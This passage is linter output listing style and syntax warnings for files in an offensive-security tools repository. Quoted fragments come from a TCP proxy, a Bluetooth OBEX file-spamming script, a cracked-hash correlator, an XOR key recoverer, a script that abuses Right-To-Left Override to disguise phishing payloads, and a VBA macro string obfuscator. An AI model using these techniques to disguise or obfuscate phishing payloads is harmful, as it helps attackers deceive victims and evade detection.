    |         ^^^^^^^^^^
111 |         remoteSock.settimeout(config["timeout"])
112 |         remoteSock.connect((remoteHost, remotePort))
    |

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\networks\tcpproxy.py:116:25
    |
114 |         Logger.dbg("Connected.")
115 |
116 |     except Exception as e:
    |                         ^
117 |         Logger.err(
118 |             "TCP Proxy was unable to connect to REMOTE service: {}:{}".format(
    |
help: Remove assignment to unused variable `e`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\tcpproxy.py:118:13
    |
116 |       except Exception as e:
117 |           Logger.err(
118 | /             "TCP Proxy was unable to connect to REMOTE service: {}:{}".format(
119 | |                 remoteHost, remotePort
120 | |             ),
    | |_____________^
121 |               fatal=True,
122 |           )
    |
help: Convert to f-string

N806 Variable `remoteBuff` in function should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:125:9
    |
124 |     if recvFirst:
125 |         remoteBuff = recvFrom(remoteSock)
    |         ^^^^^^^^^^
126 |         Logger.info(
127 |             "[<==] Received {} bytes from REMOTE service.".format(len(remoteBuff))
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\tcpproxy.py:127:13
    |
125 |         remoteBuff = recvFrom(remoteSock)
126 |         Logger.info(
127 |             "[<==] Received {} bytes from REMOTE service.".format(len(remoteBuff))
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
128 |         )
129 |         Logger.dbg(
    |
help: Convert to f-string

N806 Variable `remoteBuffOrig` in function should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:133:9
    |
131 |         )
132 |
133 |         remoteBuffOrig = remoteBuff
    |         ^^^^^^^^^^^^^^
134 |         remoteBuff = responseHandler(remoteBuff)
    |

N806 Variable `remoteBuff` in function should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:134:9
    |
133 |         remoteBuffOrig = remoteBuff
134 |         remoteBuff = responseHandler(remoteBuff)
    |         ^^^^^^^^^^
135 |
136 |         if remoteBuff != remoteBuffOrig:
    |

F524 `.format` call is missing argument(s) for placeholder(s): 1
   --> security\penetration-testing-tools\networks\tcpproxy.py:138:17
    |
136 |           if remoteBuff != remoteBuffOrig:
137 |               Logger.dbg(
138 | /                 "Buffer to be sent to LOCAL service modified. Lengths: {} -> {}".format(
139 | |                     len(remoteBuffOrig, remoteBuff)
140 | |                 )
    | |_________________^
141 |               )
142 |               Logger.dbg(
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\tcpproxy.py:149:17
    |
147 |         if len(remoteBuff):
148 |             Logger.info(
149 |                 "[<==] Sending {} bytes to LOCAL service.".format(len(remoteBuff))
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
150 |             )
151 |             clientSock.send(remoteBuff)
    |
help: Convert to f-string

N806 Variable `localBuff` in function should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:157:9
    |
156 |         # LOCAL part
157 |         localBuff = recvFrom(clientSock)
    |         ^^^^^^^^^
158 |         if len(localBuff):
159 |             Logger.info(
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\tcpproxy.py:160:17
    |
158 |         if len(localBuff):
159 |             Logger.info(
160 |                 "[==>] Received {} bytes from LOCAL service.".format(len(localBuff))
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
161 |             )
162 |             Logger.dbg("Local service Recv buff:\n" + hexdump(localBuff))
    |
help: Convert to f-string

N806 Variable `localBuffOrig` in function should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:164:13
    |
162 |             Logger.dbg("Local service Recv buff:\n" + hexdump(localBuff))
163 |
164 |             localBuffOrig = localBuff
    |             ^^^^^^^^^^^^^
165 |             localBuff = requestHandler(localBuff)
    |

N806 Variable `localBuff` in function should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:165:13
    |
164 |             localBuffOrig = localBuff
165 |             localBuff = requestHandler(localBuff)
    |             ^^^^^^^^^
166 |
167 |             if localBuff != localBuffOrig:
    |

F524 `.format` call is missing argument(s) for placeholder(s): 1
   --> security\penetration-testing-tools\networks\tcpproxy.py:169:21
    |
167 |               if localBuff != localBuffOrig:
168 |                   Logger.dbg(
169 | /                     "Buffer to be sent to REMOTE service modified. Lengths: {} -> {}".format(
170 | |                         len(localBuffOrig, localBuff)
171 | |                     )
    | |_____________________^
172 |                   )
173 |                   Logger.dbg(
    |

N806 Variable `remoteBuff` in function should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:182:9
    |
181 |         # REMOTE part
182 |         remoteBuff = recvFrom(remoteSock)
    |         ^^^^^^^^^^
183 |         if len(remoteBuff):
184 |             Logger.info(
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\tcpproxy.py:185:17
    |
183 |         if len(remoteBuff):
184 |             Logger.info(
185 |                 "[<==] Received {} bytes from REMOTE service.".format(len(remoteBuff))
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
186 |             )
187 |             Logger.dbg("Remote service Recv buff:\n" + hexdump(remoteBuff))
    |
help: Convert to f-string

N806 Variable `remoteBuffOrig` in function should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:189:13
    |
187 |             Logger.dbg("Remote service Recv buff:\n" + hexdump(remoteBuff))
188 |
189 |             remoteBuffOrig = remoteBuff
    |             ^^^^^^^^^^^^^^
190 |             remoteBuff = responseHandler(remoteBuff)
    |

N806 Variable `remoteBuff` in function should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:190:13
    |
189 |             remoteBuffOrig = remoteBuff
190 |             remoteBuff = responseHandler(remoteBuff)
    |             ^^^^^^^^^^
191 |
192 |             if remoteBuff != remoteBuffOrig:
    |

F524 `.format` call is missing argument(s) for placeholder(s): 1
   --> security\penetration-testing-tools\networks\tcpproxy.py:194:21
    |
192 |               if remoteBuff != remoteBuffOrig:
193 |                   Logger.dbg(
194 | /                     "Buffer to be sent to LOCAL service modified. Lengths: {} -> {}".format(
195 | |                         len(remoteBuffOrig, remoteBuff)
196 | |                     )
    | |_____________________^
197 |                   )
198 |                   Logger.dbg(
    |

N803 Argument name `localHost` should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:214:16
    |
214 | def serverLoop(localHost, localPort, remoteHost, remotePort, receiveFirst):
    |                ^^^^^^^^^
215 |     serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    |

N803 Argument name `localPort` should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:214:27
    |
214 | def serverLoop(localHost, localPort, remoteHost, remotePort, receiveFirst):
    |                           ^^^^^^^^^
215 |     serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    |

N803 Argument name `remoteHost` should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:214:38
    |
214 | def serverLoop(localHost, localPort, remoteHost, remotePort, receiveFirst):
    |                                      ^^^^^^^^^^
215 |     serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    |

N803 Argument name `remotePort` should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:214:50
    |
214 | def serverLoop(localHost, localPort, remoteHost, remotePort, receiveFirst):
    |                                                  ^^^^^^^^^^
215 |     serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    |

N803 Argument name `receiveFirst` should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:214:62
    |
214 | def serverLoop(localHost, localPort, remoteHost, remotePort, receiveFirst):
    |                                                              ^^^^^^^^^^^^
215 |     serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\tcpproxy.py:219:19
    |
217 |     try:
218 |         serv.bind((localHost, localPort))
219 |         Logger.ok("TCP Proxy listening on: {}:{}".format(localHost, localPort))
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
220 |
221 |         serv.listen(5)
    |
help: Convert to f-string

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\networks\tcpproxy.py:223:25
    |
221 |         serv.listen(5)
222 |
223 |     except Exception as e:
    |                         ^
224 |         Logger.err(
225 |             "TCP Proxy server was unable to bound to {}:{}".format(
    |
help: Remove assignment to unused variable `e`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\tcpproxy.py:225:13
    |
223 |       except Exception as e:
224 |           Logger.err(
225 | /             "TCP Proxy server was unable to bound to {}:{}".format(
226 | |                 localHost, localPort
227 | |             ),
    | |_____________^
228 |               fatal=True,
229 |           )
    |
help: Convert to f-string

N806 Variable `clientSock` in function should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:232:9
    |
231 |     while True:
232 |         clientSock, addr = serv.accept()
    |         ^^^^^^^^^^
233 |         Logger.info(
234 |             "[==>] Received incoming connection from: {}:{}".format(addr[0], addr[1])
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\tcpproxy.py:234:13
    |
232 |         clientSock, addr = serv.accept()
233 |         Logger.info(
234 |             "[==>] Received incoming connection from: {}:{}".format(addr[0], addr[1])
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
235 |         )
236 |         proxyThread = threading.Thread(
    |
help: Convert to f-string

N806 Variable `proxyThread` in function should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:236:9
    |
234 |             "[==>] Received incoming connection from: {}:{}".format(addr[0], addr[1])
235 |         )
236 |         proxyThread = threading.Thread(
    |         ^^^^^^^^^^^
237 |             target=proxyHandler, args=(clientSock, remoteHost, remotePort, receiveFirst)
238 |         )
    |

N806 Variable `usageStr` in function should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:246:5
    |
244 |     global config
245 |
246 |     usageStr = """
    |     ^^^^^^^^
247 |     tcpproxy.py [options] <LOCAL> <REMOTE>
    |

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\networks\tcpproxy.py:248:1
    |
246 |     usageStr = """
247 |     tcpproxy.py [options] <LOCAL> <REMOTE>
248 |     
    | ^^^^
249 | Example:
250 |     tcpproxy.py 127.0.0.1:9000 192.168.56.102:9000
    |
help: Remove whitespace from blank line

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\tcpproxy.py:309:16
    |
307 |         config["verbose"] = args.verbose
308 |     config["timeout"] = float(args.timeout)
309 |     Logger.dbg("Timeout set to: {} seconds.".format(args.timeout))
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
310 |
311 |     return (args.localhost, args.remotehost, args.recvfirst)
    |
help: Convert to f-string

N806 Variable `localHost` in function should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:316:5
    |
314 | def main():
315 |     local, remote, recvfirst = processOpts(sys.argv)
316 |     localHost, localPort = local.split(":")
    |     ^^^^^^^^^
317 |     remoteHost, remotePort = remote.split(":")
    |

N806 Variable `localPort` in function should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:316:16
    |
314 | def main():
315 |     local, remote, recvfirst = processOpts(sys.argv)
316 |     localHost, localPort = local.split(":")
    |                ^^^^^^^^^
317 |     remoteHost, remotePort = remote.split(":")
    |

N806 Variable `remoteHost` in function should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:317:5
    |
315 |     local, remote, recvfirst = processOpts(sys.argv)
316 |     localHost, localPort = local.split(":")
317 |     remoteHost, remotePort = remote.split(":")
    |     ^^^^^^^^^^
318 |
319 |     try:
    |

N806 Variable `remotePort` in function should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:317:17
    |
315 |     local, remote, recvfirst = processOpts(sys.argv)
316 |     localHost, localPort = local.split(":")
317 |     remoteHost, remotePort = remote.split(":")
    |                 ^^^^^^^^^^
318 |
319 |     try:
    |

N806 Variable `localPort` in function should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:320:9
    |
319 |     try:
320 |         localPort = int(localPort)
    |         ^^^^^^^^^
321 |         if localPort < 0 or localPort > 65535:
322 |             raise ValueError
    |

N806 Variable `remotePort` in function should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:327:9
    |
326 |     try:
327 |         remotePort = int(remotePort)
    |         ^^^^^^^^^^
328 |         if remotePort < 0 or remotePort > 65535:
329 |             raise ValueError
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\tcpproxy.py:334:9
    |
333 |     Logger.info(
334 |         "Proxying: {}:{} => {}:{}".format(localHost, localPort, remoteHost, remotePort)
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
335 |     )
    |
help: Convert to f-string

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\others\bluetoothObexSpam.py:25:11
   |
24 | def printDev(name, dev, txt='Bluetooth device'):
25 |     print '[+] %s: "%s" (MAC: %s)' % (txt, name, dev)
   |           ^^^^^^^^^^^^^^^^^^^^^^^^
26 |
27 | def retBtAddr(addr):
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\others\bluetoothObexSpam.py:45:15
   |
43 |         client = obexftp.client(obexftp.BLUETOOTH)
44 |         channel = obexftp.browsebt(dev, obexftp.PUSH)
45 |         print '[>] Sending file to %s@%s' % (dev, str(channel))
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^
46 |         client.connect(dev, channel)
47 |         ret = client.put_file(filename)
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\others\bluetoothObexSpam.py:49:19
   |
47 |         ret = client.put_file(filename)
48 |         if int(ret) >= 1:
49 |             print '[>] File has been sent.'
   |                   ^^^^^^^^^^^^^^^^^^^^^^^^^
50 |         else:
51 |             print '[!] File has not been accepted.'
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\others\bluetoothObexSpam.py:51:19
   |
49 |             print '[>] File has been sent.'
50 |         else:
51 |             print '[!] File has not been accepted.'
   |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
52 |         client.disconnect()
53 |     else:
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\others\bluetoothObexSpam.py:54:15
   |
52 |         client.disconnect()
53 |     else:
54 |         print '[!] Specified file: "%s" does not exists.'
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
55 |
56 | def findDevs(opts):
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\others\bluetoothObexSpam.py:81:11
   |
79 |     parser.add_option('-s', '--spam', dest='spam', action='store_true', help='Spam found devices with the file continuosly')
80 |
81 |     print '\nBluetooth file carpet bombing via OBEX Object Push'
   |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
82 |     print 'Mariusz Banach / MGeeky 16\n'
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\others\bluetoothObexSpam.py:82:11
   |
81 |     print '\nBluetooth file carpet bombing via OBEX Object Push'
82 |     print 'Mariusz Banach / MGeeky 16\n'
   |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
83 |
84 |     (opts, args) = parser.parse_args()
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\others\bluetoothObexSpam.py:88:19
   |
86 |     if opts.file != '':
87 |         if not os.path.exists(opts.file):
88 |             print '[!] Specified file: "%s" does not exists.'
   |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
89 |             sys.exit(0)
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\others\bluetoothObexSpam.py:91:11
   |
89 |             sys.exit(0)
90 |
91 |     print '[+] Started Bluetooth scanning. Ctr-C to stop...'
   |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
92 |
93 |     timeout = float(opts.time)
   |

invalid-syntax: Multiple exception types must be parenthesized on Python 3.11 (syntax was added in Python 3.14)
  --> security\penetration-testing-tools\others\bluetoothObexSpam.py:98:12
   |
96 |             findDevs(opts)
97 |             time.sleep(timeout)
98 |     except KeyboardInterrupt, e:
   |            ^^^^^^^^^^^^^^^^^^^^
99 |         print '\n[?] User interruption.'
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
   --> security\penetration-testing-tools\others\bluetoothObexSpam.py:99:15
    |
 97 |             time.sleep(timeout)
 98 |     except KeyboardInterrupt, e:
 99 |         print '\n[?] User interruption.'
    |               ^^^^^^^^^^^^^^^^^^^^^^^^^^
100 |
101 | if __name__ == '__main__':
    |

W292 No newline at end of file
   --> security\penetration-testing-tools\others\bluetoothObexSpam.py:102:11
    |
101 | if __name__ == '__main__':
102 |     main()
    |           ^
    |
help: Add trailing newline

N806 Variable `usernamesFile` in function should be lowercase
  --> security\penetration-testing-tools\others\correlateCrackedHashes.py:38:5
   |
36 |         return False
37 |
38 |     usernamesFile = argv[1]
   |     ^^^^^^^^^^^^^
39 |     crackedHashesFile = argv[2]
40 |     delimiter = "," if len(argv) < 4 else argv[3]
   |

N806 Variable `crackedHashesFile` in function should be lowercase
  --> security\penetration-testing-tools\others\correlateCrackedHashes.py:39:5
   |
38 |     usernamesFile = argv[1]
39 |     crackedHashesFile = argv[2]
   |     ^^^^^^^^^^^^^^^^^
40 |     delimiter = "," if len(argv) < 4 else argv[3]
   |

N806 Variable `crackedPass` in function should be lowercase
  --> security\penetration-testing-tools\others\correlateCrackedHashes.py:60:9
   |
58 |     correlated = []
59 |
60 |     for crackedPass in cracked:
   |         ^^^^^^^^^^^
61 |         for user in usernames:
62 |             posOfLastColon = crackedPass.rfind(":")
   |

N806 Variable `posOfLastColon` in function should be lowercase
  --> security\penetration-testing-tools\others\correlateCrackedHashes.py:62:13
   |
60 |     for crackedPass in cracked:
61 |         for user in usernames:
62 |             posOfLastColon = crackedPass.rfind(":")
   |             ^^^^^^^^^^^^^^
63 |             hashValue = crackedPass[:posOfLastColon]
64 |             password = crackedPass[posOfLastColon + 1 :]
   |

N806 Variable `hashValue` in function should be lowercase
  --> security\penetration-testing-tools\others\correlateCrackedHashes.py:63:13
   |
61 |         for user in usernames:
62 |             posOfLastColon = crackedPass.rfind(":")
63 |             hashValue = crackedPass[:posOfLastColon]
   |             ^^^^^^^^^
64 |             password = crackedPass[posOfLastColon + 1 :]
   |

W293 Blank line contains whitespace
  --> security\penetration-testing-tools\others\xor-key-recovery.py:24:1
   |
23 |     return ''.join(out)
24 |         
   | ^^^^^^^^
25 |
26 | def brute(input_xored, expected_output, key_len):
   |
help: Remove whitespace from blank line

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\others\xor-key-recovery.py:30:15
   |
29 |     if len(input_xored) != len(expected_output):
30 |         print '[!] Input xored and expected output lengths not match!'
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
31 |         return False
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\others\xor-key-recovery.py:51:19
   |
50 |         if not found:
51 |             print '[!] Could not found partial key value.'
   |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
52 |             break
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\others\xor-key-recovery.py:58:15
   |
56 | def main(argv):
57 |     if len(argv) < 4:
58 |         print 'Usage: %s <cipher> <plain> <key-len>'
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
59 |         return False
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\others\xor-key-recovery.py:66:15
   |
65 |     if len(cipher) != len(plain):
66 |         print '[!] Cipher text and plain text must be of same length!'
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
67 |         return False
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\others\xor-key-recovery.py:70:15
   |
69 |     if len(cipher) % keylen != 0:
70 |         print '[!] Cipher text and plain text lengths must be divisble by keylen!'
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
71 |         return False
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\others\xor-key-recovery.py:73:11
   |
71 |         return False
72 |
73 |     print "Cipher text:\t%s" % cipher
   |           ^^^^^^^^^^^^^^^^^^
74 |     print "Plain text:\t%s" % plain
75 |     print "Key length:\t%d" % keylen
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\others\xor-key-recovery.py:74:11
   |
73 |     print "Cipher text:\t%s" % cipher
74 |     print "Plain text:\t%s" % plain
   |           ^^^^^^^^^^^^^^^^^
75 |     print "Key length:\t%d" % keylen
76 |     key, status = brute(cipher, plain, keylen)
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\others\xor-key-recovery.py:75:11
   |
73 |     print "Cipher text:\t%s" % cipher
74 |     print "Plain text:\t%s" % plain
75 |     print "Key length:\t%d" % keylen
   |           ^^^^^^^^^^^^^^^^^
76 |     key, status = brute(cipher, plain, keylen)
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\others\xor-key-recovery.py:79:15
   |
78 |     if status:
79 |         print '[+] Key recovered!'
   |               ^^^^^^^^^^^^^^^^^^^^
80 |         print '\tKey:\t\t\t', str(key)
81 |         print '\tDecrypted string:\t' + xorstring(cipher, key)
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\others\xor-key-recovery.py:80:15
   |
78 |     if status:
79 |         print '[+] Key recovered!'
80 |         print '\tKey:\t\t\t', str(key)
   |               ^^^^^^^^^^^^^^
81 |         print '\tDecrypted string:\t' + xorstring(cipher, key)
82 |     else:
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\others\xor-key-recovery.py:81:15
   |
79 |         print '[+] Key recovered!'
80 |         print '\tKey:\t\t\t', str(key)
81 |         print '\tDecrypted string:\t' + xorstring(cipher, key)
   |               ^^^^^^^^^^^^^^^^^^^^^^^
82 |     else:
83 |         print '[!] Key not found.'
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\others\xor-key-recovery.py:83:15
   |
81 |         print '\tDecrypted string:\t' + xorstring(cipher, key)
82 |     else:
83 |         print '[!] Key not found.'
   |               ^^^^^^^^^^^^^^^^^^^^
84 |
85 | if __name__ == '__main__':
   |

F401 [*] `shutil` imported but unused
  --> security\penetration-testing-tools\phishing\DancingRightToLeft.py:17:8
   |
15 | import argparse
16 | import os
17 | import shutil
   |        ^^^^^^
18 | import string
19 | import sys
   |
help: Remove unused import: `shutil`

F401 [*] `string` imported but unused
  --> security\penetration-testing-tools\phishing\DancingRightToLeft.py:18:8
   |
16 | import os
17 | import shutil
18 | import string
   |        ^^^^^^
19 | import sys
   |
help: Remove unused import: `string`

SIM102 Use a single `if` statement instead of nested `if` statements
  --> security\penetration-testing-tools\phishing\DancingRightToLeft.py:58:5
   |
56 |           sys.exit(1)
57 |
58 | /     if not args.dryrun:
59 | |         if not os.path.isfile(args.filename):
   | |_____________________________________________^
60 |               print("[!] Input file does not exist!")
61 |               sys.exit(1)
   |
help: Combine `if` statements using `and`

W293 Blank line contains whitespace
  --> security\penetration-testing-tools\phishing\DancingRightToLeft.py:70:1
   |
68 |         """
69 |     :: Dancing Right-To-Left
70 |     
   | ^^^^
71 |     A script abusing Right-To-Left Override unicode byte to rename phishing payloads.
   |
help: Remove whitespace from blank line

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> security\penetration-testing-tools\phishing\DancingRightToLeft.py:131:9
    |
129 |       #
130 |       if not args.dryrun:
131 | /         with open(old, "rb") as oldfile:
132 | |             with open(new, "wb") as newfile:
    | |____________________________________________^
133 |                   newfile.write(oldfile.read())
134 |       else:
    |
help: Combine `with` statements

N801 Class name `bcolors` should use CapWords convention
  --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:32:7
   |
32 | class bcolors:
   |       ^^^^^^^
33 |     HEADER = "\033[95m"
34 |     OKBLUE = "\033[94m"
   |

N803 Argument name `obfuscateChar` should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:98:24
    |
 96 |     DEOBFUSCATE_ROUTINE_NAME = "MacroStringDeobfuscate"
 97 |
 98 |     def __init__(self, obfuscateChar=None, obfuscateNumber=None):
    |                        ^^^^^^^^^^^^^^^^^^
 99 |         self.obfuscateChar = obfuscateChar
100 |         self.obfuscateNum = obfuscateNumber
    |

N803 Argument name `obfuscateNumber` should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:98:44
    |
 96 |     DEOBFUSCATE_ROUTINE_NAME = "MacroStringDeobfuscate"
 97 |
 98 |     def __init__(self, obfuscateChar=None, obfuscateNumber=None):
    |                                            ^^^^^^^^^^^^^^^^^^^^
 99 |         self.obfuscateChar = obfuscateChar
100 |         self.obfuscateNum = obfuscateNumber
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:110:16
    |
108 |     @staticmethod
109 |     def obfuscateCharWrapper(x):
110 |         return '"{}"'.format(x)
    |                ^^^^^^^^^^^^^^^^
111 |
112 |     @staticmethod
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:114:16
    |
112 |     @staticmethod
113 |     def obfuscateNumWrapper(x):
114 |         return "{}".format(x)
    |                ^^^^^^^^^^^^^^
115 |
116 |     @staticmethod
    |
help: Convert to f-string

N803 Argument name `addDeobfName` should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:128:39
    |
126 |         return (a, b, c, d)
127 |
128 |     def obfuscateString(self, string, addDeobfName=True):
    |                                       ^^^^^^^^^^^^^^^^^
129 |         chars = list(string)
130 |         obfuscated = b""
    |

N806 Variable `obfuscatedDword` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:147:13
    |
145 |             dword0.reverse()
146 |             dword = BitShuffleStringObfuscator.composeDword(*dword0)
147 |             obfuscatedDword = self.uintObfuscate(dword)
    |             ^^^^^^^^^^^^^^^
148 |             obfuscated += struct.pack("<I", obfuscatedDword)
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:153:19
    |
151 |             return (
152 |                 BitShuffleStringObfuscator.DEOBFUSCATE_ROUTINE_NAME
153 |                 + '("%s")' % base64.b64encode(obfuscated).decode()
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
154 |             )
155 |         else:
    |
help: Replace with format specifiers

N806 Variable `rawDword` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:170:13
    |
168 |             dword0.reverse()
169 |             dword = BitShuffleStringObfuscator.composeDword(*dword0)
170 |             rawDword = self.uintRestore(dword)
    |             ^^^^^^^^
171 |             out += struct.pack("<I", rawDword)
    |

UP034 [*] Avoid extraneous parentheses
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:186:27
    |
185 |         t = ctypes.c_uint((num ^ (num >> d1)) & mask1).value
186 |         u = ctypes.c_uint((num ^ t ^ (t << d1))).value
    |                           ^^^^^^^^^^^^^^^^^^^^^
187 |         t = ctypes.c_uint((u ^ (u >> d2)) & mask2).value
188 |         out = ctypes.c_uint(u ^ t ^ (t << d2)).value
    |
help: Remove extraneous parentheses

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:207:16
    |
206 |       def getDeobfuscatorCode(self):
207 |           return """
    |  ________________^
208 | | Public Function shrLong(ByVal Value As Long, ByVal Shift As Byte) As Long
209 | |     shrLong = Value
210 | |     If Shift > 0 Then
211 | |         If Value > 0 Then
212 | |             shrLong = Int(shrLong / (2 ^ Shift))
213 | |         Else
214 | |             If Shift > 31 Then
215 | |                 shrLong = 0
216 | |             Else
217 | |                 shrLong = shrLong And &H7FFFFFFF
218 | |
219 | |                 shrLong = Int(shrLong / (2 ^ Shift))
220 | |
221 | |                 shrLong = shrLong Or 2 ^ (31 - Shift)
222 | |             End If
223 | |         End If
224 | |     End If
225 | | End Function
226 | |
227 | | Public Function shlLong(ByVal Value As Long, ByVal Shift As Byte) As Long
228 | |     shlLong = Value
229 | |     If Shift > 0 Then
230 | |         Dim i As Byte
231 | |         Dim m As Long
232 | |         For i = 1 To Shift
233 | |             ' save 30th bit
